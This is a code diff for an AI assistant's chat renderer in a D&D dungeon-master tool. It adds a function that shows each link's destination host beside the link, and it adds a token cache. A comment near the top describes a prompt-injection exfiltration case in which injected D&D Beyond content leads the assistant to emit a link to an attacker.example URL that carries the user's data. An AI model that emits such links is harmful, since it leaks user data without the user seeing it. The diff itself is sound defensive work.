@@ -162,11 +162,69 @@ export function tokenizeInline(text: string): InlineToken[] {
     });
 }
 
+// Model-authored links are the one residual prompt-injection exfiltration
+// channel: injected D&D Beyond content can make the assistant emit
+// [innocent text](https://attacker.example?d=<data>), and the anchor shows
+// only the text — the DM can't see where a click actually sends that data.
+// So every http(s) link gets its destination host rendered beside it, unless
+// the visible text already names the host. mailto:/relative hrefs carry no
+// host to disclose; an href that fails URL parsing can't navigate anywhere
+// meaningful, so it gets no label either. Exported for tests.
+export function linkHost(href: string, text: string): string | null {
+  if (!/^https?:\/\//i.test(href)) return null;
+  let host: string;
+  try {
+    host = new URL(href).hostname;
+  } catch {
+    return null;
+  }
+  if (!host) return null;
+  // Suppress the disclosure only when the visible text names the host as a
+  // STANDALONE token, not merely as a substring: a plain `includes` would let
+  // `email me at mail.com` text hide an `ail.com` destination (host is a
+  // substring of `mail.com`). Require the host to be flanked by non-domain
+  // characters (anything outside [a-z0-9.-]) or a string boundary, so a host
+  // that is only part of a larger domain in the text still gets disclosed.
+  const escaped = host.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const named = new RegExp(`(^|[^a-z0-9.-])${escaped}([^a-z0-9.-]|$)`, "i");
+  return named.test(text) ? null : host;
+}
+
+// tokenizeInline is regex splitting + per-part matching, and a streaming chat
+// message re-renders on every SSE chunk — re-tokenizing every already-complete
+// line each time (O(n²) over the reply). Lines are immutable strings, so cache
+// tokens by text. Bounded LRU: streaming feeds the cache a new key for each
+// growing version of the incomplete trailing line ("H", "He", "Hel", …), each
+// used exactly once, so a wholesale clear-at-cap would evict the stable
+// completed-line entries right alongside that transient churn and force them to
+// re-tokenize on the next chunk. LRU instead lets the one-shot partials age out
+// first (they're never touched again) while the hot completed lines — read on
+// every chunk — stay resident.
+const MAX_CACHED_LINES = 2000;
+const inlineTokenCache = new Map<string, InlineToken[]>();
+function tokenizeInlineCached(text: string): InlineToken[] {
+  const hit = inlineTokenCache.get(text);
+  if (hit) {
+    // Re-insert to mark most-recently-used (Map preserves insertion order).
+    inlineTokenCache.delete(text);
+    inlineTokenCache.set(text, hit);
+    return hit;
+  }
+  const tokens = tokenizeInline(text);
+  if (inlineTokenCache.size >= MAX_CACHED_LINES) {
+    // Evict the least-recently-used entry — the oldest key in insertion order.
+    const oldest = inlineTokenCache.keys().next().value;
+    if (oldest !== undefined) inlineTokenCache.delete(oldest);
+  }
+  inlineTokenCache.set(text, tokens);
+  return tokens;
+}
+
 // Render inline **bold**, *italic*, `code`, and [links](…) within one line.
 function renderInline(text: string): JSX.Element {
   return (
     <>
-      {tokenizeInline(text).map((t, i) => {
+      {tokenizeInlineCached(text).map((t, i) => {
         if (t.kind === "bold") {
           return <strong key={i} className="font-semibold" style={{ color: "var(--dm-t1)" }}>{t.text}</strong>;
         }
@@ -175,10 +233,18 @@ function renderInline(text: string): JSX.Element {
           return <code key={i} className="px-1 py-0.5 rounded bg-black/30 text-[0.95em]" style={{ color: "var(--dm-t1)" }}>{t.text}</code>;
         }
         if (t.kind === "link") {
+          const host = linkHost(t.href, t.text);
           return (
-            <a key={i} href={t.href} target="_blank" rel="noreferrer noopener" className="underline text-amber-300/90 hover:text-amber-200">
-              {t.text}
-            </a>
+            <Fragment key={i}>
+              <a href={t.href} target="_blank" rel="noreferrer noopener" className="underline text-amber-300/90 hover:text-amber-200">
+                {t.text}
+              </a>
+              {host && (
+                <span className="text-[0.85em]" style={{ color: "var(--dm-t3)" }}>
+                  {" "}({host})
+                </span>
+              )}
+            </Fragment>
           );
         }
         return <Fragment key={i}>{t.text}</Fragment>;
